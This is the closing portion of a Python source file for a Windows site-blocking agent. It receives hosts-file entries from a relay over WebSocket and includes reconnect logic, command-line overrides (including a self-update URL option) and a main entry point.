                                        exit_code=EXIT_CODE_RELAY_CONNECTION_FAILURE,
                                        error_code="relay_connection_failed",
                                        message=f"Relay connection failed: {exc}",
                                    ) from exc
                                raise

                            if not isinstance(raw_message, str):
                                await _raise_agent_failure(
                                    ws,
                                    exit_code=EXIT_CODE_INVALID_RELAY_MESSAGE,
                                    error_code="invalid_relay_message",
                                    message="Relay sent a non-text WebSocket message.",
                                )

                            try:
                                data = json.loads(raw_message)
                            except json.JSONDecodeError as exc:
                                await _raise_agent_failure(
                                    ws,
                                    exit_code=EXIT_CODE_INVALID_RELAY_MESSAGE,
                                    error_code="invalid_relay_message",
                                    message=f"Relay sent malformed JSON: {exc}",
                                )

                            if not isinstance(data, dict):
                                await _raise_agent_failure(
                                    ws,
                                    exit_code=EXIT_CODE_INVALID_RELAY_MESSAGE,
                                    error_code="invalid_relay_message",
                                    message="Relay sent a non-object JSON message.",
                                )

                            await _handle_relay_message(ws, data)
                            receive_task = asyncio.create_task(ws.recv())
                finally:
                    tasks = [
                        task
                        for task in (status_task, log_task, self_update_task, receive_task)
                        if task is not None
                    ]
                    for task in tasks:
                        task.cancel()
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
            except AgentRestartRequested:
                raise
            except AgentProcessError:
                raise
            except Exception as exc:
                await _raise_agent_failure(
                    ws,
                    exit_code=EXIT_CODE_FATAL,
                    error_code="agent_runtime_failure",
                    message=f"Agent encountered a fatal runtime error: {exc}",
                )
    except AgentRestartRequested:
        raise
    except AgentProcessError:
        raise
    except Exception as exc:
        raise AgentProcessError(
            exit_code=EXIT_CODE_RELAY_CONNECTION_FAILURE,
            error_code="relay_connection_failed",
            message=f"Failed to connect to relay at {relay_ws_url}: {exc}",
        ) from exc


async def run_forever() -> None:
    while True:
        try:
            await listen()
            return
        except AgentRestartRequested:
            raise
        except AgentProcessError as exc:
            if exc.error_code != "relay_connection_failed":
                raise

            logging.warning(
                "%s Retrying in %s seconds.",
                exc.message,
                RELAY_RECONNECT_DELAY_SECONDS,
            )
            await asyncio.sleep(RELAY_RECONNECT_DELAY_SECONDS)


def _apply_cli_overrides(args: argparse.Namespace) -> None:
    global AGENT_NAME, HOSTS_FILE, RELAY_RECONNECT_DELAY_SECONDS, RELAY_WS_URL_OVERRIDE
    global SELF_UPDATE_INTERVAL_SECONDS
    global SELF_UPDATE_URL_OVERRIDE, STATUS_REPORT_INTERVAL_SECONDS

    if getattr(args, "relay_url", None):
        RELAY_WS_URL_OVERRIDE = _coerce_ws_url(str(args.relay_url).strip())

    if getattr(args, "self_update_url", None) is not None:
        SELF_UPDATE_URL_OVERRIDE = str(args.self_update_url).strip()

    if getattr(args, "hosts_file", None):
        HOSTS_FILE = str(args.hosts_file).strip()

    status_report_interval = getattr(args, "status_report_interval", None)
    if status_report_interval is not None:
        if status_report_interval <= 0:
            raise SystemExit("--status-report-interval must be greater than 0.")
        STATUS_REPORT_INTERVAL_SECONDS = status_report_interval

    self_update_interval = getattr(args, "self_update_interval", None)
    if self_update_interval is not None:
        if self_update_interval <= 0:
            raise SystemExit("--self-update-interval must be greater than 0.")
        SELF_UPDATE_INTERVAL_SECONDS = self_update_interval

    relay_reconnect_delay = getattr(args, "relay_reconnect_delay", None)
    if relay_reconnect_delay is not None:
        if relay_reconnect_delay <= 0:
            raise SystemExit("--relay-reconnect-delay must be greater than 0.")
        RELAY_RECONNECT_DELAY_SECONDS = relay_reconnect_delay

    if getattr(args, "log_level", None):
        logging.getLogger().setLevel(getattr(logging, str(args.log_level).upper()))

    if getattr(args, "agent_name", None):
        AGENT_NAME = str(args.agent_name).strip()


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Block sites by syncing Windows hosts entries from the relay."
    )
    parser.add_argument(
        "--relay-url",
        help="Override the relay URL or WebSocket URL for this run.",
    )
    parser.add_argument(
        "--hosts-file",
        help="Override the hosts file path for this run.",
    )
    parser.add_argument(
        "--self-update-url",
        help="Raw URL used to fetch updated blocker/agent.py contents for self-update.",
    )
    parser.add_argument(
        "--status-report-interval",
        type=int,
        metavar="SECONDS",
        help="Override the status report interval for this run.",
    )
    parser.add_argument(
        "--self-update-interval",
        type=int,
        metavar="SECONDS",
        help="Override the self-update polling interval for this run.",
    )
    parser.add_argument(
        "--relay-reconnect-delay",
        type=int,
        metavar="SECONDS",
        help="Override the relay reconnect delay after transport failures for this run.",
    )
    parser.add_argument(
        "--log-level",
        choices=["CRITICAL", "ERROR", "WARNING", "INFO", "DEBUG", "VERBOSE"],
        help="Override the log level for this run.",
    )
    parser.add_argument(
        "--agent-name",
        help="Override the agent name reported to the relay for this run.",
    )
    parser.add_argument(
        "command",
        nargs="?",
        choices=["host"],
        help="Print the current hosts file and exit.",
    )
    return parser


def main() -> int:
    args = _build_parser().parse_args()
    _apply_cli_overrides(args)

    if args.command == "host":
        return _print_hosts_file()

    instance_lock = acquire_single_instance_lock()
    if sys.platform == "win32" and instance_lock is None:
        logging.warning("Another agent instance is already running. Exiting.")
        return 0

    try:
        try:
            asyncio.run(run_forever())
        except AgentRestartRequested as exc:
            logging.info("%s", exc)
            return 0
        except AgentProcessError as exc:
            logging.error("Agent exiting with code %s (%s): %s", exc.exit_code, exc.error_code, exc.message)
            return exc.exit_code
        except Exception as exc:
            logging.exception("Agent exiting with an unexpected fatal error: %s", exc)
            return EXIT_CODE_FATAL
    finally:
        release_single_instance_lock(instance_lock)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
